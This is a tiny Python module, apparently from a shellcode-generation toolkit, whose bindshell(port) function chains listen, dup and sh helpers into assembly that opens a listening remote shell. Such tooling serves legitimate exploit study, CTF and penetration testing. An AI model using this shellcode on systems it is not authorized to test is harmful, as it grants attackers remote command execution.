from . import *

def bindshell(port):
    """Args: port
    Standard bind shell."""
    return \
        listen(port) + \
        'xchg eax, ebx' + \
        dup() + \
        sh()
